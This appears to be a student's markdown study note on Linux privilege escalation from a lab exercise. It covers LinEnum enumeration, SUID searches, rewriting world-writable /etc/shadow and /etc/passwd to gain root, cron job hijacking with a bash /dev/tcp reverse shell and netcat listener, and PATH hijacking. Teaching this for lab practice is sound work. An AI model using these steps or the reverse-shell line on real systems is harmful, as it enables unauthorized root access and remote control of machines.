#### privilege escalation
Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it's the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

**Why is it important?**
This allow you to do many things, including:
-  Reset passwords  
-  Bypass access controls to compromise protected data
-  Edit software configurations
-  Enable persistence, so you can access the machine again later.
-  Change privilege of users
As well as any other administrator or super user commands that you desire.

#### LinEnum
LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root.

LinEnum is a Linux Enumeration Script written in Bash that helps enumerate and gather information about a Linux system for privilege escalation, security assessments, and penetration testing purposes. It's designed to automate the process of collecting various details about the system configuration and potential vulnerabilities that could be exploited by an attacker.

download LinEnum from [https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

##### how LinEnum works and what it does:
1. **Information Gathering**: LinEnum starts by gathering basic information about the Linux system, including details about the kernel, hostname, operating system version, and available users and groups.
2. **System Checks**: It then performs various system checks to identify potential security issues and misconfigurations. This includes checking for the presence of common security tools, writable files and directories, installed packages, running processes, and open network ports.
3. **Filesystem Analysis**: LinEnum analyzes the filesystem to identify files with special permissions (e.g., setuid, setgid, world-writable), which could potentially be exploited for privilege escalation.
4. **Enumeration of Configuration Files**: It enumerates configuration files, such as `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, and others, to extract information about user accounts, passwords, sudo privileges, and other system settings.
5. **Detection of Common Vulnerabilities**: LinEnum checks for common vulnerabilities and misconfigurations that could be exploited for privilege escalation, such as insecure file permissions, outdated software versions, and misconfigured services.
6. **Reporting**: Finally, LinEnum generates a detailed report summarizing the findings of the enumeration process. The report includes information about the system configuration, potential vulnerabilities, and recommendations for further investigation and remediation.
##### How to use LinEnum?
- **Download LinEnum**: First, download LinEnum from its official repository on GitHub.
- **Transfer LinEnum to the Target System**: Transfer the LinEnum script to the Linux system you want to enumerate.
	-  Python web server
	-  if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using Vi or Nano. Once you've done this, you can save the file with the **".sh"** extension.
- **Make LinEnum Executable**: Ensure that LinEnum is executable by running the following command: `chmod +x LinEnum.sh`
- **Run LinEnum**: Execute LinEnum by running the script with bash
	- `./LinEnum.sh` or `bash LinEnum.sh`
- **Review the Output**: LinEnum will begin enumerating the system and gathering information. It will display the results in the terminal as it progresses.
- 

#### Finding and Exploiting SUID Files
The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group.
###### Finding SUID Binaries  
We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: 
**"find / -perm -u=s -type f 2>/dev/null"** to search the file system for SUID/GUID files. Let's break down this command.
- **find** - Initiates the "find" command  
- **/** - Searches the whole file system  
- **-perm** - searches for files with specific permissions  
- **-u=s** - Any of the permission bits _mode_ are set for the file. Symbolic modes are accepted in this form
- **-type f** - Only search for files  
- **2>/dev/null** - Suppresses errors

#### Exploiting Writable /etc/shadow
The /etc/shadow file contains user password hashes and is usually readable only by the root user.
Note that the /etc/shadow file on the VM is world-writable:
`ls -l /etc/shadow`
Generate a new password hash with a password of your choice:
`mkpasswd -m sha-512 newpasswordhere`  
Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
Switch to the root user, using the new password:
`su root`
#### Exploiting Writeable /etc/passwd
**Understanding /etc/passwd**
The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a **plain text file**. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

**Understanding /etc/passwd format**
The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon ":" symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows: `test:x:0:0:root:/root:/bin/bash`
1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".  
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5. **User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

*e.g:* 
	create a compliant password hash to add:
			**openssl passwd -1 -salt** < *salt*> < *password*> or 
			*openssl passwd < newpasswordhere>*
	create a new root user account in  /etc/passwd: 
			< *u_name*>:< *hash_pass*>**:0:0:root:/root:/bin/bash**

#### Escaping Vi Editor
**Sudo -l** - list what commands you're able to use as a super user on that account.

**Misconfigured Binaries and [GTFOBins]([https://gtfobins.github.io/](https://gtfobins.github.io/))**
If there is a misconfigured binary find during enumeration or check what binaries a user account you have access to can access, a good place to look up how to exploit them is [GTFOBins]([https://gtfobins.github.io/](https://gtfobins.github.io/)). GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary.

#### Exploiting Crontab
##### What is Cron?
The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

We can use the command **"cat /etc/crontab"** to view what cron jobs are scheduled.

**Format of a Cronjob**
Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
	#= ID  
	m = Minute
	h = Hour
	dom = Day of the month
	mon = Month
	dow = Day of the week
	user = What user the command will run as  
	command = What command should be run

	For Example,   **#  m   h dom mon dow user  command**  
	17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
	
Note that the if we notice that a file is world-writable:
	e.g: `ls -l /usr/local/bin/overwrite.sh
	`
Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
	`#!/bin/bash ` 
	`bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run.
`nc -nvlp 4444`

#### Exploiting PATH Variable
##### What is PATH
PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs.
##### How does this let us escalate privileges?
*e.g:* Let's say we have an SUID binary **script**. Running it, we can see that it’s calling the system shell to do a basic process.

- [x] Run the file “script”. What command do we think that it’s executing?
	![](https://miro.medium.com/v2/resize:fit:936/1*O8W78-6IB6g0k8Ks4byhAQ.png)
It looks like the output of the ls command.

- [x] Now we know what command to imitate, let’s change directory to “tmp”.
	![](https://miro.medium.com/v2/resize:fit:315/1*6lj3bQFwZwaUgeKJzmEHQw.png)

- [x] Now we’re inside tmp, let’s create an imitation executable. The format for what we want to do is:
	echo “[whatever command we want to run]” > [name of the executable we’re imitating]

- What would the command look like to open a bash shell, writing to a file with the name of the executable we’re imitating?
	`echo “/bin/bash” >> ls`

- [x] Great! Now we’ve made our imitation, we need to make it an executable. What command do we execute to do this?
	`chmod +x ls`

- [x] Now, we need to change the PATH variable, so that it points to the directory where we have our imitation “ls” stored! We do this using the command “export PATH=/tmp:$PATH”
	- Note, this will cause you to open a bash prompt every time you use “ls”. If you need to use “ls” before you finish the exploit, use` “/bin/ls”` where the real “ls” executable is.
	- Once you’ve finished the exploit, you can exit out of root and use#` “export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH” `to reset the PATH variable back to default, letting you use “ls” again!
		![](https://miro.medium.com/v2/resize:fit:879/1*AHhIU83Z9RKbeLriWCdMUg.png)

- [x] Now, change directory back to home directory /the script file is here/.
	![](https://miro.medium.com/v2/resize:fit:299/1*9-5CBN4q2g4R_GzCXsmLyg.png)

- [x] Now, run the “script” file again, you should be sent into a root bash prompt!
	![](https://miro.medium.com/v2/resize:fit:936/1*Jg5I3UlUxDkL_fW0t_C7-A.png)

